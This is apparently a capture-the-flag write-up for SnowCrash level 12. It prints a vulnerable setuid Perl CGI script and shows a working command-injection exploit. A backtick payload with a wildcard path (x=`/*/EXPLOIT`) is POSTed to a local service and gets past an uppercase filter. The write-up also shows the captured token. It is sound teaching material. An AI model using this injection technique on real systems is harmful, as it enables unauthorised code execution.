# level12

- We login as user level11.
```
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

- A perl script has been left to us, let's `cat level12.pl`:
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

- The script appears to be designed to be executed by a [CGI](https://en.wikipedia.org/wiki/Common_Gateway_Interface) through a service listening on localhost through 4646. It takes two parameters that are passed to the `t()` function, the return of this latter is used to `print()` a message accordingly.


- The `t()` function will change all lowercase characters contained in its first parameter to uppercase, then it will erase any character following a space. The resulting string (`$xx`) will be used by `egrep "^$xx" /tmp/xd 2>&1`.


- Because of `$xx =~ tr/a-z/A-Z/;` we cannot directly send `x=;getflag>/tmp/level12.flag` because all our characters will be transformed into uppercase, so:
```
level12@SnowCrash:~$ ss -tunlp | grep 4646
tcp    LISTEN     0      128                   :::4646                 :::*
```

```
level12@SnowCrash:~$ echo "getflag > /tmp/level12.flag" > /tmp/EXPLOIT
```

```
level12@SnowCrash:~$ chmod +x /tmp/EXPLOIT
```

```
level12@SnowCrash:~$ curl -X POST -d "x=\`/*/EXPLOIT\`" http://127.0.0.1:4646
```

```
level12@SnowCrash:~cat /tmp/level12.flag46
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

```
level12@SnowCrash:~$ su level13
Password:g1qKMiRpXf53AWhDaU7FEkczr
level13@SnowCrash:~$
```
